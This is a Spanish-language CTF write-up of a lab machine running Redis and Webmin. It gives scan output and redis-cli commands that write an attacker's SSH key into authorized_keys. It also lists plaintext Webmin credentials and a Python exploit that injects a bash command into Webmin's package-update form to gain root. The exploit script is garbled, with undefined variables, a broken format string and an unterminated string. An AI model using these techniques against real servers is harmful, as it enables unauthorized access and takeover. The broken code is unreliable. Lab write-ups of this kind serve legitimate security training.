--------
- Tags:
---------
## Técnicas utilizadas
- Redis Enumeration  
- Redis Exploitation - Write SSH Key  
- Webmin Exploitation - Python Scripting  
- We create our own exploit in Python - AutoPwn [Ruby code adaptation from Metasploit]
## Procedimiento

![[Pasted image 20230626113720.png]]

#### Reconocimiento

Si lanzamos un escaneo con **nmap** nos da como resultado los siguientes puertos:
```ruby
# nmap -sCV -p22,80,6379,10000 10.10.10.160 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-26 11:55 MST
Nmap scan report for 10.10.10.160
Host is up (0.13s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46834ff13861c01c74cbb5d14a684d77 (RSA)
|   256 2d8d27d2df151a315305fbfff0622689 (ECDSA)
|_  256 ca7c82aa5ad372ca8b8a383a8041a045 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.63 seconds

```

Un escaneo con **whatweb** nos muestra las siguientes tecnologías corriendo por detras del sitio web:
```ruby
# whatweb 10.10.10.160
http://10.10.10.160 [200 OK] Apache[2.4.29], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.160], JQuery, Script, Title[The Cyber Geek's Personal Website], X-UA-Compatible[IE=edge]
```

---------
#### Redis Enumeration 

Podemos enumerar el servicio de redis con la herramienta **redis-cli** que viene por defecto en **Parrot-OS**.

--------
#### Redis Exploitation - Write SSH Key

Nos vamos aprovechar de cierta configuracion para poder meter nuestra clave publica en el **authorized_keys** del usuario **redis**.
Lo primero que tenemos que hacer es copiarnos la **id_rsa.pub** al espacio de trabajo:
```
# (echo -e "\n\n"; cat ~/id_rsa.pub; echo -e "\n\n") > spaced_key.txt
```

Luego tenemos que importar la **id_rsa.pub** al servidor **redis**:
```
# cat spaced_key.txt | redis-cli -h 10.10.10.160 -x set ssh_key
```

Posterior a esto, podemos contectarnos y ejecutar las siguientes lineas:
```
10.85.0.52:6379> config set dir /var/lib/redis/.ssh

OK

10.85.0.52:6379> config set dbfilename "authorized_keys"

OK

10.85.0.52:6379> save

OK
```

-------
#### Webmin Exploitation - Python Scripting

Una vez en la maquina, vemos que se filtra una id_rsa.bak en el **bash_history** del usuario **redis**.
El archivo esta cifrado, pero si rompemos la contraseña con **john** podemos dar con la contraseña del usuario **MATT**.
Esta misma contraseña es la que se necesita para iniciar sesión en **Webmin**. Una vez aqui, listando la versión de **Webmin** encontramos que es algo antigua y que cuenta con una vulnerabilidad de tipo **Remote Code Execution.** Podemos abusar de diversos scripts para ganar acceso como root.

A continuación se comparte un **AutoPwn** creado en directo por S4vitar.
```python
#!/usr/bin/python3

from pwn import *
import urllib3
import requests
import pdb
import signal
import sys
import threading

# ctrl + c 
def def_handler(sig,frame):
	print("\n[!] Saliendo...")
	sys.exit(1)
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "https://10.10.10.160:10000/session_login.cgi"


# Funciones
def makeRequest():

	urllib3.disable_warnings()
	s = requests.session()
	s.verify = False
	
	post_data = {
		"user" : "Matt",
		"pass" : "computer2008"
	}

	headers = {
		'Cookie' : 'redirect=1; testing=1; sid=x' % cookie
	}
	
	r = s.post(login, data=post_data, headers=headers)

	post_data = [('u', 'acl/apt'), ('u' , ' | bash -c ), ('ok_top', 'Update Selected Packages')]
	headers = {'Referer': 'https://10.10.10.160:10000/package-updates/?xnavigation=1'}
	
	r = s.post(update_url, data=post_data, headers=headers)
	print(r.text)

if __name__ == "__main__":
	makeRequest()
```